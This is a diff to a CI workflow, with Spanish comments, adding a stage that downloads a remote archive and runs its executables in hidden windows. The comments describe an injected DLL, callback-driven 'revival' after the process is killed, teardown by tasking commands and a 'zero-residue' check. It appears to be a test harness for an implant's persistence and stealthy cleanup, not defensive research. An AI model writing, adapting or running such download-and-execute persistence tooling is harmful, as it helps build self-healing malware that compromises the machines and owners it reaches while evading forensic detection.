@@ -16,7 +16,7 @@ on:
   workflow_dispatch:
     inputs:
       stage:
-        description: "pipeline stage: local | fetch | run | tls | p5"
+        description: "pipeline stage: local | fetch | run | tls | p5 | master"
         required: true
         default: local
       expected_sha256:
@@ -140,6 +140,75 @@ jobs:
             Write-Host "tls step done"
             exit 0
           }
+          if ($stage -eq 'master') {
+            # E8-MASTER v15: coexistencia P4+P5 -> kill -> revival P4 (host.exe carga
+            # posee.dll inyectada; gen2 re-ejecuta el sobre = auto-healing) -> teardown
+            # por tasking [tlso,pfunr,tlsp,pfrun] -> cero-residuo (hash == ORIGHASH) ->
+            # control negativo (recarga de la dll revertida NO revive).
+            $zip = Join-Path $env:RUNNER_TEMP "pack.zip"
+            Invoke-WebRequest -Uri $env:SRC_URL -OutFile $zip -UseBasicParsing
+            $h = (Get-FileHash $zip -Algorithm SHA256).Hash.ToLower()
+            Write-Host ("pack sha256=" + $h)
+            $want = "${{ inputs.expected_sha256 }}"
+            if ($want -and ($h -ne $want.ToLower())) { Write-Host "SHA MISMATCH"; exit 1 }
+            $dir = Join-Path $env:RUNNER_TEMP "pm"
+            Expand-Archive -Path $zip -DestinationPath $dir -Force
+            Remove-Item $zip -Force
+            $svc = Get-ChildItem $dir -Filter 'svc.exe' | Select-Object -First 1
+            $host_exe = Get-ChildItem $dir -Filter 'host.exe' | Select-Object -First 1
+            $dllf = Get-ChildItem $dir -Filter 'posee.dll' | Select-Object -First 1
+            if (-not $svc -or -not $host_exe -or -not $dllf) { Write-Host "NO PACK PARTS"; exit 1 }
+            $origDllHash = (Get-FileHash $dllf.FullName -Algorithm SHA256).Hash.ToLower()
+            Write-Host ("P4 ORIGHASH=" + $origDllHash)
+            # 1) gen1: sobre A = installs P4+P5 + sondas VERDE (coexistencia mismo proceso)
+            $p = Start-Process -FilePath $svc.FullName -PassThru -WindowStyle Hidden
+            Write-Host ("PM OLDPID=" + $p.Id)
+            Start-Sleep -Seconds 260
+            $alive = Get-Process -Id $p.Id -ErrorAction SilentlyContinue
+            if ($alive) { Write-Host ("PM gen1 alive cpu=" + $alive.CPU) } else { Write-Host "PM gen1 ended early" }
+            # 2) runner reset: kill del gen1 (P4-P5 deben coexistir HASTA aca)
+            Stop-Process -Id $p.Id -Force -ErrorAction SilentlyContinue
+            Write-Host "PM gen1 killed"
+            Start-Sleep -Seconds 5
+            # 3) revival P4: host.exe #1 -> callback -> svc gen2; el gen2 re-ejecuta el
+            #    sobre A (guard 'ya' + re-registro P5 + sondas) = AUTO-HEALING.
+            $h2 = Start-Process -FilePath $host_exe.FullName -PassThru -WindowStyle Hidden
+            Write-Host ("PM host1 pid=" + $h2.Id)
+            Start-Sleep -Seconds 25
+            Write-Host ("PM REV count25=" + @(Get-Process svc -ErrorAction SilentlyContinue).Count)
+            Start-Sleep -Seconds 215
+            Write-Host ("PM REV count240=" + @(Get-Process svc -ErrorAction SilentlyContinue).Count)
+            # 4) ventana teardown (+505..+1405): gen2 consume sobre B y contesta
+            Start-Sleep -Seconds 900
+            # 5) cero-residuo por disco: hash de la dll revertida vs ORIGHASH
+            $dllNow = (Get-FileHash $dllf.FullName -Algorithm SHA256).Hash.ToLower()
+            Write-Host ("P4 DLLHASH=" + $dllNow)
+            Write-Host ("P4 RESID=" + $(if ($dllNow -eq $origDllHash) {"CLEAN"} else {"DIRTY"}))
+            # 6) control negativo: kill del gen2 + recarga de la dll REVERTIDA -> sin
+            #    callback no hay gen3; cualquier svc vivo = fallo del teardown.
+            Get-Process svc -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
+            Write-Host "PM gen2 killed"
+            Start-Sleep -Seconds 5
+            $h3 = Start-Process -FilePath $host_exe.FullName -PassThru -WindowStyle Hidden
+            Write-Host ("PM host2 pid=" + $h3.Id)
+            Start-Sleep -Seconds 25
+            Write-Host ("P4 NEG count25=" + @(Get-Process svc -ErrorAction SilentlyContinue).Count)
+            $h3 | Wait-Process -Timeout 60 -ErrorAction SilentlyContinue
+            Stop-Process -Id $h3.Id -Force -ErrorAction SilentlyContinue
+            $wer = Get-WinEvent -FilterHashtable @{LogName='Application'; Level=2} -MaxEvents 10 -ErrorAction SilentlyContinue
+            if ($wer) {
+              foreach ($w in $wer) {
+                $msg = ($w.Message -replace "\s+", " ")
+                Write-Host ("WER " + $w.TimeCreated.ToString("HH:mm:ss.fff") + ": " + $msg.Substring(0, [Math]::Min(360, $msg.Length)))
+              }
+            } else { Write-Host "WER none" }
+            $evf = Join-Path $dir "hostev.txt"
+            if (Test-Path $evf) { Write-Host ("HOSTEV: " + (Get-Content $evf -Raw)) } else { Write-Host "HOSTEV: ausente" }
+            Remove-Item $dir -Recurse -Force -ErrorAction SilentlyContinue
+            Write-Host "master step done"
+            exit 0
+          }
+
           if ($stage -eq 'p5') {
             $zip = Join-Path $env:RUNNER_TEMP "pack.zip"
             Invoke-WebRequest -Uri $env:SRC_URL -OutFile $zip -UseBasicParsing
